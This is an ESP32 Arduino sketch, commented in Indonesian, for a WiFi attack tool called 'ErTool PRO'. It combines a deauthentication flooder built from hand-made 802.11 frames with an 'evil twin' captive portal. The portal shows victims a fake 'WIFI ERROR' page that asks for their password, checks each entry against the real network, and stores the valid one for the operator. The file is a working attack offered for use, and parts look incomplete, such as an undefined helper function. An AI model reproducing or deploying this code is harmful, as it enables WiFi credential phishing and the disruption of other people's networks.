#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <Preferences.h> // Untuk simpan permanen

struct _Network { String ssid; uint8_t bssid[6]; int ch; };
_Network _networks[16];
_Network _selectedNetwork;
WebServer server(80);
DNSServer dnsServer;
Preferences pref;

bool deauth_active = false, hotspot_active = false;
String _capturedPass = "", _statusMsg = "Menunggu...";

// --- FUNGSI VALIDASI PASSWORD ---
bool validatePass(String ssid, String pass) {
  _statusMsg = "Memvalidasi password...";
  WiFi.begin(ssid.c_str(), pass.c_str());
  int retry = 0;
  while (WiFi.status() != WL_CONNECTED && retry < 20) { // Tunggu ~10 detik
    delay(500);
    retry++;
  }
  bool success = (WiFi.status() == WL_CONNECTED);
  WiFi.disconnect();
  WiFi.mode(WIFI_AP_STA); // Balik ke mode awal
  return success;
}

void handleLogin() {
  if (server.hasArg("password")) {
    String tryPass = server.arg("password");
    if (validatePass(_selectedNetwork.ssid, tryPass)) {
      _capturedPass = tryPass;
      pref.putString("saved_pass", _capturedPass);
      _statusMsg = "BERHASIL! Password valid disimpan.";
      hotspot_active = false; // Stop serangan jika sudah dapat
      deauth_active = false;
    } else {
      _statusMsg = "GAGAL: Password salah dimasukkan korban.";
    }
  }
  server.send(200, "text/html", "<html><script>location.href='/';</script></html>");
}

void handleIndex() {
  // Redirect korban ke Captive Portal jika Hotspot Aktif
  if (hotspot_active && server.hostHeader() != WiFi.softAPIP().toString()) {
    const char html[] = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#000;color:#fff;text-align:center;font-family:sans-serif;padding:20px;}.box{border:1px solid #f90;padding:20px;border-radius:10px;}input{width:100%;padding:15px;margin:10px 0;}button{width:100%;padding:15px;background:#f90;border:none;font-weight:bold;}</style></head><body><div class='box'><h2>WIFI ERROR</h2><p>Silakan masukkan kembali password untuk memulihkan koneksi.</p><form method='POST' action='/login'><input type='password' name='password' placeholder='Password WiFi' required><button type='submit'>PULIHKAN SEKARANG</button></form></div></body></html>";
    server.send(200, "text/html", html);
    return;
  }

  // Handle Hapus Password
  if (server.hasArg("del")) {
    pref.remove("saved_pass");
    _capturedPass = "";
    _statusMsg = "Data dihapus.";
  }

  // --- HTML ADMIN PANEL ---
  String h = "<html><body style='background:#1a1a1a;color:#eee;font-family:sans-serif;'>";
  h += "<h1>ErTool PRO</h1>";
  h += "<p>Target: <b>" + (_selectedNetwork.ssid == "" ? "None" : _selectedNetwork.ssid) + "</b></p>";
  h += "<p>Status: <span style='color:yellow'>" + _statusMsg + "</span></p>";
  
  if (_capturedPass != "") {
    h += "<div style='background:green;padding:10px;'>PASSWORD TERTANGKAP: <b>" + _capturedPass + "</b> ";
    h += "<a href='/?del=1' style='color:white;'>[HAPUS]</a></div>";
  }

  h += "<hr><form action='/scan' method='POST'><button>SCAN</button></form>";
  h += "<a href='/?deauth=" + String(deauth_active ? "stop" : "start") + "'><button>" + String(deauth_active ? "STOP DEAUTH" : "START DEAUTH") + "</button></a>";
  h += "<a href='/?hotspot=" + String(hotspot_active ? "stop" : "start") + "'><button>" + String(hotspot_active ? "STOP EVIL" : "START EVIL") + "</button></a>";
  
  h += "<table border='1' width='100%'><tr><th>SSID</th><th>Aksi</th></tr>";
  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") break;
    h += "<tr><td>" + _networks[i].ssid + "</td><td><a href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>PILIH</a></td></tr>";
  }
  h += "</table></body></html>";
  server.send(200, "text/html", h);
}

void setup() {
  Serial.begin(115200);
  pref.begin("wifi-tool", false);
  _capturedPass = pref.getString("saved_pass", ""); // Load pass lama jika ada

  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_ps(WIFI_PS_NONE);
  WiFi.softAP("ErTool_Admin", "12345678");

  server.on("/", handleIndex);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/scan", HTTP_POST, [](){
    int n = WiFi.scanNetworks();
    for (int i=0; i<16 && i<n; i++) {
      _networks[i].ssid = WiFi.SSID(i); _networks[i].ch = WiFi.channel(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
    server.sendHeader("Location", "/"); server.send(302);
  });
  server.begin();
}

void loop() {
  server.handleClient();
  if (hotspot_active) dnsServer.processNextRequest();

  // Deauth Engine
  if (deauth_active && _selectedNetwork.ssid != "" && millis() % 100 == 0) {
    uint8_t pkt[26] = {0xc0,0x00,0x3a,0x01,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00};
    memcpy(&pkt[10], _selectedNetwork.bssid, 6);
    memcpy(&pkt[16], _selectedNetwork.bssid, 6);
    esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, false);
  }
}
